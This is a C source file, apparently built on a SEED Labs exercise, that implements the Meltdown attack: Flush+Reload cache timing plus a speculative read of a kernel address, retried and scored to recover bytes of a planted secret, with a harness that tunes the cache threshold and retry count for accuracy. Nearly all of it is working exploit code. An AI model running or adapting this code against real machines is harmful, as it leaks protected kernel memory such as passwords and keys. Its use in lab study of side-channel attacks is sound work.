#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <time.h>


/*********************** Flush + Reload ************************/
uint8_t array[256*4096];
/* cache hit time threshold assumed*/

#define DELTA 1024
#define ADDRESS 0xf9e1f000

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved(int threshold)
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
     addr = &array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= threshold)
        scores[i]++; /* if cache hit, add 1 for this value */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // Give eax register something to do
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;              
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
   siglongjmp(jbuf, 1);
}



int grabByte(int address, int threshold, int retries) {
  int i, j, ret = 0;
  
  // Register signal handler
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  
  memset(scores, 0, sizeof(scores));
  flushSideChannel();
  
    
  // Retry 1000 times on the same address.
  for (i = 0; i < retries; i++) {
  ret = pread(fd, NULL, 0, 0);
  if (ret < 0) {
    perror("pread");
    break;
  }
  
  // Flush the probing array
  for (j = 0; j < 256; j++) 
    _mm_clflush(&array[j * 4096 + DELTA]);

  if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(address); }

  reloadSideChannelImproved(threshold);
  }

  // Find the index with the highest score.
  int max = 0;
  int scoreSum=0;
  for (i = 0; i < 256; i++) {
  if (scores[max] < scores[i]) max = i;
  }

  close(fd);

  return max;
}


double runExperiment (int cacheThreshold, int retries) {
 // char password[]="SEEDLabs";
//char password[]="2!awYwEIP*a233PppjzO4QfvLMGHh^^KHhUVsX-Sj+!KjZ1YZ@Yn2Kp-9%D1I**Tw9VJwUBD309hr^?3470$-SXu0M%#BAo_#|wG";
char password[]="WZBYMdrLYhPq2scQRR6D8rJTxy56G2HPuXCEAfSSf4LJ9WT3xAWtBAKbjXwXzR9JyJPLQH72AJ59Fedw4xSS3SANTFcHaST2DLAn5Ga7vdpSUSGRWgK2gHpA9nFAVatUeVvWvTZFwJ3BcYa42a5ZbnqN3TtErPMScaKHE9xDTEmF7PnzpkVtMsyx6T4yFTZhep9E2AkKu8aFaTBRZVre2XpdQBuGWPF5VjzCa9pgP6atwB6dDBpSkvaxK63T7R23GUtyBAaUbhEffJhaSYFrWBbfSXapKnEVgjeBaEGTyceDYKjzxszuDVNJcv7E3WnDBPYNquuETQ6jnSfwFvEHkQUkYKTXWWbRAgNh5KyWwmGyJvJBStRjbrkXqDKC3PH5Z4tABJKmg6pcWpFKpdaEaC4K3D32DJJU6sL5dE7wZHdGGhSs3tnhLEWAh4a29NDPNYcgGBRdfXGuGjLLWFAKnYPNsgdEybTNzvwQC6F8tdKfQvrch3xQ7zdY6u4mprYY3fhZFeHKNmuSQPzejg4TLTLV3Rgf4PVexCNjWkKwFRykyC65Ww8sNQnpGUJsJRjFH5MPxcreXLm3KNvC4xRwVq9Nc7ECdzQqTdmGW92Tm52AXS8ezyrzqdeeJuSZE8ZTR8wxg2WkLcJxEhD92GxtyTDUXgYRabyuQVwrvFvwHAsjAPub7dM84ckkQ9L26eMEVyAvZhtH76VfQ3pSqKLbLMNLKjjgshMxJ2Wn5NvcPxkYfwKDYFRG3nMVB5UrrvbvzmVqkhs5zS3n9AECgcB4Gc7XzJsXy4GTbmLUTDYkqCwfaRe2NKgunpL6SHNPNR3tRCVpJj7FqdDr8rxRFJnb5PuuH6h4rXTtGNHAachQQhubX8t8RhaXZeLrhckhg6qTvdSqCczXLzQCkjXNtVAb4HHJr5KH5pHfDnzLcVdZYDzeNK5UvZ7DzJ9ax3mzJVxqX9t7C5egGqeJtfBYwSVZjJSaqnf9D3L6YkerhewjZFPgY6R6RHDqD6z8j7GGgED3";
  int max = (int)(sizeof(password)/sizeof(password[0]))-1;
  //minus one due to the termination char at end of string
  char results[max];
  double hits = 0;
  double accuracy;

  for (int i = 0; i<max; i++) {
    results[i]=grabByte(ADDRESS+i, cacheThreshold, retries);
    if (results[i] == password[i]) {
      hits ++;
    }
  }

  accuracy = 100*(hits/max);
  return accuracy;
}


double lowestRetry(int threshold, int retries, double attempts, double cutOff, int consequtiveStrikes) {
  double averageAccuracy = 100;
  int strikes=0;
  int lowestSuccessful = retries;
  char finalString[80];
  printf("Lowest Retry at threshold {%d}, starting at {%d} retries",threshold, retries);

  while ( strikes <= consequtiveStrikes) {
    double accuracySum=0;
    double timeSum=0;
    double averageTime=0;
    for (int i = 0; i <attempts; i++) {
      clock_t begin = clock();
      accuracySum+=runExperiment(threshold, retries);
      clock_t end = clock();
      timeSum += (double)(1000*((end - begin)))/CLOCKS_PER_SEC;//milliseconds
    }
    averageAccuracy = accuracySum/attempts;
    averageTime = timeSum/attempts;
    if (averageAccuracy<cutOff) {
      strikes++;
    } else {
      strikes = 0;
      lowestSuccessful = retries;
     // sprintf(finalString,"\nThreshold: %d\nRetries: %d\nAccuracy: %.2f%%\nTime: %fSeconds\n", threshold, retries, averageAccuracy, averageTime);
    }
  
   printf("\nThreshold: %d\nRetries: %d\nAccuracy: %.2f%%\nTime: %f Milliseconds\n", 
    threshold, retries, averageAccuracy, averageTime);
  retries--;

    if (strikes > consequtiveStrikes) {
       // printf("\nThreshold: %d\nRetries: %d\nAccuracy: %.2f%%\nTime: %.6fSeconds\n", threshold, retries, averageAccuracy, averageTime);
    }
  }
  printf("%s\n", finalString);
  return lowestSuccessful;

}

int main()
{
  for (int i=0; i<10; i++){
    printf("New Test Suite Run----------------------\n");
    //starting values
    int threshold=80;
    int retries = 100;
    int previousRetries=retries+1;
    int stepSize=5;


    while(previousRetries > retries || threshold < 200) {
  //finding the minimum amount of retries for each cache threshold
      // as cache threshold goes up, the amount of retries should go down
      previousRetries = retries;
      retries=lowestRetry(threshold, previousRetries, 10, 90, 10);
      threshold+=stepSize;
    }
  }
  
  return 0;
}
